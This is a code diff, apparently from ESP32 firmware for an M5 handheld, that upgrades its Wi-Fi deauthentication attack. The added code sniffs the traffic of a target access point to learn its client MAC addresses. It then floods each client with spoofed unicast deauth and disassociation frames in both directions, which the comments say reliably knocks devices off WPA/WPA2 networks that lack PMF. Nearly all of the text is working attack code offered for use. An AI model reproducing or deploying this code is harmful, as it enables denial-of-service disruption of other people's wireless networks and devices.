@@ -58,6 +58,42 @@ static const uint8_t DEAUTH_TMPL[26] = {
     0x02, 0x00                            // reason: prev auth no longer valid
 };
 
+// ---- Targeted deauth --------------------------------------------------------
+// Broadcast deauth is ignored by most modern clients, so we run promiscuous on
+// the target's channel, learn the MACs of stations talking to its BSSID, and
+// hit each one with unicast deauth + disassoc (both directions). This is what
+// actually kicks devices off WPA/WPA2 networks (no 802.11w/PMF).
+static uint8_t          g_targetBssid[6];
+static uint8_t          g_clients[16][6];
+static volatile uint8_t g_clientCount = 0;
+
+static inline bool is_mcast(const uint8_t *m) { return m[0] & 0x01; }
+
+static void sniff_cb(void *buf, wifi_promiscuous_pkt_type_t type) {
+    const wifi_promiscuous_pkt_t *p = (const wifi_promiscuous_pkt_t *)buf;
+    const uint8_t *pl = p->payload;
+    const uint8_t *a1 = pl + 4;      // addr1 (RA/DA)
+    const uint8_t *a2 = pl + 10;     // addr2 (TA/SA)
+    const uint8_t *cli = nullptr;
+    if (memcmp(a1, g_targetBssid, 6) == 0 && !is_mcast(a2)) cli = a2;
+    else if (memcmp(a2, g_targetBssid, 6) == 0 && !is_mcast(a1)) cli = a1;
+    if (!cli || memcmp(cli, g_targetBssid, 6) == 0) return;
+    for (int i = 0; i < g_clientCount; i++)
+        if (memcmp(g_clients[i], cli, 6) == 0) return;
+    if (g_clientCount < 16) { memcpy(g_clients[g_clientCount], cli, 6); g_clientCount++; }
+}
+
+// Send deauth + disassoc for one (dst,src,bssid) triple on the STA interface.
+static void kick(const uint8_t *dst, const uint8_t *src, const uint8_t *bssid) {
+    uint8_t f[26];
+    memcpy(f, DEAUTH_TMPL, sizeof(f));
+    memcpy(f + 4, dst, 6);
+    memcpy(f + 10, src, 6);
+    memcpy(f + 16, bssid, 6);
+    f[0] = 0xC0; esp_wifi_80211_tx(WIFI_IF_STA, f, sizeof(f), false);   // deauth
+    f[0] = 0xA0; esp_wifi_80211_tx(WIFI_IF_STA, f, sizeof(f), false);   // disassoc
+}
+
 // Funny SSID list for beacon spam.
 static const char *const FUNNY_SSIDS[] = {
     "FBI Surveillance Van",  "Free Public WiFi",     "Pretty Fly for a WiFi",
@@ -181,38 +217,48 @@ static void do_scan() {
     WiFi.mode(WIFI_OFF);
 }
 
-// Broadcast-deauth a single AP on its channel until stopped. Sends on the STA
-// interface (WIFI_IF_AP silently drops frames unless a SoftAP is started).
+// Kick a single AP: sniff its associated clients and unicast-deauth them
+// (plus a broadcast for legacy clients) until stopped.
 static void run_deauth_ap(const NetInfo &ap) {
-    wifi_attack_begin(ap.ch);
+    WiFi.mode(WIFI_STA);
+    delay(80);
+    memcpy(g_targetBssid, ap.bssid, 6);
+    g_clientCount = 0;
+    esp_wifi_set_channel(ap.ch, WIFI_SECOND_CHAN_NONE);
+    wifi_promiscuous_filter_t filt;
+    filt.filter_mask = WIFI_PROMIS_FILTER_MASK_MGMT | WIFI_PROMIS_FILTER_MASK_DATA;
+    esp_wifi_set_promiscuous_filter(&filt);
+    esp_wifi_set_promiscuous_rx_cb(&sniff_cb);
+    esp_wifi_set_promiscuous(true);
+
     M5.Display.fillScreen(COL_BG);
     ui_hint("M5 = stop    hold side = exit");
 
-    uint8_t frame[26];
-    memcpy(frame, DEAUTH_TMPL, sizeof(frame));
-    memcpy(frame + 10, ap.bssid, 6);
-    memcpy(frame + 16, ap.bssid, 6);
-
-    uint32_t sent = 0, err = 0, lastDraw = 0;
+    const uint8_t bcast[6] = {0xff, 0xff, 0xff, 0xff, 0xff, 0xff};
+    uint32_t sent = 0, lastDraw = 0;
     board_update();
     while (true) {
         board_update();
         if (nav_long || ok_click) break;
 
-        for (int r = 0; r < 8; r++) {
-            if (esp_wifi_80211_tx(WIFI_IF_STA, frame, sizeof(frame), false) == ESP_OK) sent++;
-            else err++;
-        }
-        if (millis() - lastDraw > 200) {
-            lastDraw = millis();
-            Serial.printf("[deauth] %s ch%d ok=%lu err=%lu\n",
-                          ap.ssid, ap.ch, (unsigned long)sent, (unsigned long)err);
-            char l[32];
-            snprintf(l, sizeof(l), "ch%d  pkts %lu", ap.ch, (unsigned long)sent);
-            ui_live("Deauth", ap.ssid, l);
+        kick(bcast, ap.bssid, ap.bssid); sent += 2;          // broadcast (legacy)
+        uint8_t nc = g_clientCount;
+        for (int i = 0; i < nc; i++) {
+            kick(g_clients[i], ap.bssid, ap.bssid); sent += 2;    // AP -> client
+            kick(ap.bssid, g_clients[i], ap.bssid); sent += 2;    // client -> AP
         }
         delay(1);
+
+        if (millis() - lastDraw > 200) {
+            lastDraw = millis();
+            Serial.printf("[deauth] %s ch%d clients=%u tx=%lu\n",
+                          ap.ssid, ap.ch, nc, (unsigned long)sent);
+            char l2[24];
+            snprintf(l2, sizeof(l2), "cl %u   tx %lu", nc, (unsigned long)sent);
+            ui_live("Deauth", ap.ssid, l2);
+        }
     }
+    esp_wifi_set_promiscuous(false);
     wifi_off();
 }
 
